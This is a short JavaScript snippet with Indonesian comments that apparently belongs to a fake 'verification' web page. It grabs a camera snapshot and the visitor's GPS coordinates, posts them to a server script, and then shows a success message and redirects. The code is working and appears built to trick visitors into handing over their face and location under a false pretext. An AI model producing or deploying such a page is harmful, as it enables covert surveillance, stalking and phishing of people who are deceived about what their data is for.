let stream = null;

async function startCapture() {
    const video = document.getElementById('video');
    const status = document.getElementById('status');

    try {
        // Dapatkan akses kamera
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Dapatkan lokasi
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });

        // Ambil screenshot dari video
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/jpeg');

        // Kirim ke server
        fetch('save.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                image: imageData,
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                timestamp: new Date().toISOString()
            })
        })
        .then(() => {
            status.textContent = "Verifikasi berhasil! Redirecting...";
            setTimeout(() => window.location.href = 'https://example.com/success', 3000);
        })
        .catch(err => {
            status.textContent = "Gagal mengirim data.";
            console.error(err);
        });

    } catch (err) {
        status.textContent = "Akses ditolak atau tidak didukung.";
        console.error(err);
    }
}